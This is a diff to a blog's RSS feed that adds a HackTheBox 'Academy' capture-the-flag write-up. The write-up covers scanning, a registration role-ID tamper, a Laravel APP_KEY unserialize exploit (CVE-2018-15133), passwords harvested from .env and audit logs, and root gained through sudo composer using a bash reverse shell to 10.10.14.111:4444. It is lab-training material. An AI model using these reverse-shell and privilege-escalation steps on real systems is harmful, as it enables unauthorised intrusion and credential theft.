@@ -33,6 +33,97 @@
     </item>
     
     <item>
+      <title>HackTheBox - Academy Writeup</title>
+      <link>https://mohamed-elleuch.me/writeups/htb-academy/</link>
+      <pubDate>Sat, 27 Mar 2021 00:00:00 +0000</pubDate>
+      <guid>https://mohamed-elleuch.me/writeups/htb-academy/</guid>
+      <description>&lt;h1 id=&#34;p-stylecolorredinformation-gathering-p&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Information Gathering &lt;/p&gt;&lt;/h1&gt;
+&lt;h2 id=&#34;p-stylecolorgreennmap-scan-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Nmap scan &lt;/p&gt;&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;sudo nmap -sC -sV -T5 -oA nmap -O -A -v 10.10.10.215
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;nmap.png&#34;&gt;
+As we see we have 2 ports open &lt;br/&gt;
+SSH on port 22 running OpenSSH 8.2p1 &lt;br/&gt;
+http on port 80 running httpd 2.4.41 &lt;br/&gt;
+&lt;p&gt;we notice as well the academy.htb domain, which we should add to /etc/hosts.&lt;/p&gt;
+&lt;h2 id=&#34;p-stylecolorgreengobuster-scan-p&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Gobuster scan &lt;/p&gt;&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;gobuster dir -w /opt/SecLists/Discovery/Web-Content/raft-medium-files.txt -u http://academy.htb -x php
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;gob.png&#34;&gt;
+&lt;h1 id=&#34;p-stylecolorredinitial-footholdp&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Initial Foothold&lt;/p&gt;&lt;/h1&gt;
+&lt;h2 id=&#34;p-stylecolorgreenidentifying-the-exploitp&#34;&gt;&lt;p style=&#34;color:Green&#34;&gt;Identifying the exploit&lt;/p&gt;&lt;/h2&gt;
+&lt;p&gt;So basically the first thing that tried was sql injection on &lt;b&gt; admin.php &lt;/b&gt; but that didn&amp;rsquo;t give me any results. as we don&amp;rsquo;t have any potential users let&amp;rsquo;s move on and dig further. &lt;br/&gt;&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s create an account and see if we can find any usernames and intercept it with burp&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;POST /register.php HTTP/1.1
+Host: academy.htb
+Content-Length: 53
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://academy.htb
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.146 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://academy.htb/register.php
+Accept-Encoding: gzip, deflate
+Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7
+Cookie: PHPSESSID=sdloh07q837vauvt0oqevack4o
+Connection: close
+uid=elleuch&amp;amp;password=elleuch&amp;amp;confirm=elleuch&amp;amp;roleid=0
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We can notice the &lt;b&gt;roleid&lt;/b&gt;	parameter which is set to 0. we can assume that&amp;rsquo;s assigning a role to the user we&amp;rsquo;re creating. Which basically can be a normal user ( roleid=0 ) or a privileged user ( roleid=1 ).&lt;/p&gt;
+&lt;p&gt;Let&amp;rsquo;s change change 0 to 1 and forward the request and create our privileged user and try to login to &lt;b&gt;/admin.php&lt;/b&gt;&lt;/p&gt;
+&lt;img src=&#34;planner.png&#34;&gt;
+&lt;p&gt;As we see above the planner leaks to us a subdomain &lt;b&gt;dev-staging-01.academy.htb&lt;/b&gt; &lt;br/&gt;
+Let&amp;rsquo;s add it to /etc/hosts and see what we get&lt;/p&gt;
+&lt;img src=&#34;laravel.png&#34;&gt;
+&lt;p&gt;Errors! That sounds promosing! Scrolling down we can see something really interesting&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;APP_KEY	 &amp;quot;base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We have the APP_KEY! We can abuse &lt;b&gt;Laravel Unserialize Vulnerability CVE-2018-15133 &lt;/b&gt; &lt;br/&gt;
+For this exploit we&amp;rsquo;ll be using this script, a pretty easy syntax.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;https://github.com/aljavier/exploit_laravel_cve-2018-15133/blob/main/pwn_laravel.py
+&lt;/code&gt;&lt;/pre&gt;
+&lt;img src=&#34;foothold.png&#34;&gt;
+&lt;p&gt;And voilà we&amp;rsquo;re on the box&lt;/p&gt;
+&lt;h1 id=&#34;p-stylecolorreduser-privescp&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;User Privesc&lt;/p&gt;&lt;/h1&gt;
+&lt;p&gt;Now let&amp;rsquo;s start enumarating,We already know that the webserver is running PHP Laravel. &lt;/br&gt;
+The first thing we should look at is the &lt;b&gt;.env&lt;/b&gt; file. &lt;/br&gt;
+&lt;img src=&#34;env.png&#34;&gt;
+And we get a password! &lt;br /&gt;
+&lt;code&gt;mySup3rP4s5w0rd!!&lt;/code&gt; &lt;br/&gt;
+Let&amp;rsquo;s see if it belongs to any existing user
+&lt;img src=&#34;users.png&#34;&gt;
+After manually trying to switch to these users, it turns out to be cry0l1t3&amp;rsquo;s password
+&lt;img src=&#34;logincry.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Our user is in the &lt;b&gt;adm&lt;/b&gt; group! So basically we can read logs! And also we can read the audit log! We can grab some juicy informations from it&lt;/p&gt;
+&lt;img src=&#34;mrb3.png&#34;&gt;
+&lt;p&gt;&lt;code&gt;data=6D7262336E5F41634064336D79210A&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Seems we got a password! But it&amp;rsquo;s hex encoded! Let&amp;rsquo;s decode it&lt;/p&gt;
+&lt;img src=&#34;pw.png&#34;&gt;
+&lt;p&gt;&lt;code&gt;mrb3n_Ac@d3my!&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;Seems like it&amp;rsquo;s mrb3n&amp;rsquo;s password!&lt;/p&gt;
+&lt;h1 id=&#34;p-stylecolorredroot-privescp&#34;&gt;&lt;p style=&#34;color:RED&#34;&gt;Root Privesc&lt;/p&gt;&lt;/h1&gt;
+&lt;p&gt;Mrb3n can execute &lt;b&gt;/usr/bin/composer&lt;/b&gt; as root!&lt;/p&gt;
+&lt;img src=&#34;sudo.png&#34;&gt;
+&lt;p&gt;Going through the docs of composer we can find out that we can execute a custom script using composer! we need to create a composer.json first in any folder we want!&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-json&#34;&gt;{ 
+&amp;quot;scripts&amp;quot;:{&amp;quot;shell&amp;quot;:&amp;quot;/bin/bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.111/4444 0&amp;gt;&amp;amp;1&#39;&amp;quot;}
+}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We set our listener&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;nc -lvnp 4444 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;And execute&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo /usr/bin/composer --working-dir=fake run-script shell
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img src=&#34;root.png&#34; &gt;&lt;/p&gt;
+&lt;p&gt;And we rooted the box! &lt;br/&gt;
+&lt;code&gt;uid=0(root) gid=0(root) groups=0(root)&lt;/code&gt;&lt;/p&gt;
+&lt;h2 id=&#34;thanks-for-reading-hope-you-enjoyed-it&#34;&gt;Thanks for reading hope you enjoyed it!&lt;/h2&gt;
+</description>
+    </item>
+    
+    <item>
       <title>HackLock Active Directory Workshop Writeup</title>
       <link>https://mohamed-elleuch.me/writeups/hacklockad/</link>
       <pubDate>Tue, 23 Mar 2021 00:00:00 +0000</pubDate>
